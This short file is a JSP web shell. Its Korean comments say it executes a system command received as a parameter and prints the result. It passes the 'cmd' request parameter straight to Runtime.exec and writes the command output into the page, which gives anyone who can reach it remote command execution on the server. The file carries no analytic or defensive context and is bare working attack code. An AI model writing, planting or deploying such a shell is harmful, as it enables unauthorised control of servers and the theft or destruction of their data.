<%@ page import="java.util.*,java.io.*"%>
<%
  // 파라미터로 받은 시스템 명령어 실행
  if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
      out.println(disr); // 실행 결과를 화면에 출력
      disr = dis.readLine();
    }
  }
%>